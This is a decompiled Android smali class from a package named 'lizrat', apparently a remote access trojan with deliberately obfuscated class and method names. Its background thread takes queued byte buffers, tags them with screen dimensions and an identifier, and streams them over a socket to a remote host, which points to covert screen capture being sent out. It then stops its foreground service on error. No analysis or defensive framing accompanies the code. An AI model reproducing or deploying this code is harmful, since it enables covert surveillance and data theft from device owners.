.class LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;
.super Ljava/lang/Object;
.source "weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->pr()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;


# direct methods
.method constructor <init>(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V
    .locals 0

    .line 134
    iput-object p1, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .line 137
    iget-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-virtual {v0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "SCH"

    const-string v2, "720"

    invoke-static {v0, v1, v2}, LLiz0rd/lizrat/MySettings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 138
    iget-object v1, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-virtual {v1}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "SCW"

    const-string v3, "1080"

    invoke-static {v1, v2, v3}, LLiz0rd/lizrat/MySettings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 140
    :goto_0
    invoke-static {}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$000()Z

    move-result v2

    if-eqz v2, :cond_2

    const/4 v2, 0x0

    .line 142
    :try_start_0
    sget-object v3, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->syc:Ljava/lang/Object;

    monitor-enter v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_2

    .line 143
    :try_start_1
    sget-boolean v4, LLiz0rd/lizrat/westrtranscriptstbrickosuperiorncaymanimetalsdbulgariakheldcbadlyrfrontzarcahomeqsymantecz4;->q:Z

    const/4 v5, 0x1

    if-eqz v4, :cond_0

    .line 144
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    iget-object v4, v4, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->bts:Ljava/util/List;

    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v4

    if-lez v4, :cond_1

    .line 145
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    iget-object v4, v4, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->bts:Ljava/util/List;

    invoke-interface {v4, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [B
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 148
    :try_start_2
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v7, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->s_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_cr:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, ":"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, ":"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, ":"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->PID:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6, v4}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->aclexaminejchristmaslfunctionaldopiniontdeputyxrrpevisawproposejversionqdescribempgptcreeki37(Ljava/lang/String;[B)[B

    move-result-object v4

    .line 149
    invoke-static {}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$100()Ljava/net/Socket;

    move-result-object v6

    array-length v7, v4

    invoke-virtual {v6, v7}, Ljava/net/Socket;->setSendBufferSize(I)V

    .line 150
    iget-object v6, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-static {}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$100()Ljava/net/Socket;

    move-result-object v7

    invoke-virtual {v7}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    invoke-static {v6, v7}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$202(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;Ljava/io/OutputStream;)Ljava/io/OutputStream;

    .line 151
    iget-object v6, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-static {v6}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$200(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)Ljava/io/OutputStream;

    move-result-object v6

    array-length v7, v4

    invoke-virtual {v6, v4, v2, v7}, Ljava/io/OutputStream;->write([BII)V

    .line 152
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-static {v4}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$200(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)Ljava/io/OutputStream;

    move-result-object v4

    invoke-virtual {v4}, Ljava/io/OutputStream;->flush()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_1

    .line 154
    :catch_0
    :try_start_3
    invoke-static {v2}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$002(Z)Z

    .line 155
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-static {v4}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$300(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V

    .line 156
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-virtual {v4, v5}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->stopForeground(Z)V

    .line 157
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-virtual {v4}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->stopSelf()V

    .line 158
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-static {v4}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$400(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V

    .line 168
    :goto_1
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    iget-object v4, v4, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->bts:Ljava/util/List;

    invoke-interface {v4, v2}, Ljava/util/List;->remove(I)Ljava/lang/Object;

    goto :goto_2

    .line 173
    :cond_0
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-static {v4}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$300(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V

    .line 174
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-virtual {v4, v5}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->stopForeground(Z)V

    .line 175
    iget-object v4, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;->this$0:LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-virtual {v4}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->stopSelf()V

    .line 176
    invoke-static {v2}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$002(Z)Z

    .line 179
    :cond_1
    :goto_2
    monitor-exit v3

    goto :goto_3

    :catchall_0
    move-exception v4

    monitor-exit v3
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :try_start_4
    throw v4
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4 .. :try_end_4} :catch_2

    .line 182
    :catch_1
    invoke-static {v2}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->access$002(Z)Z

    :catch_2
    :goto_3
    const-wide/16 v2, 0x1

    .line 184
    :try_start_5
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_3

    goto/16 :goto_0

    :catch_3
    nop

    goto/16 :goto_0

    :cond_2
    return-void
.end method
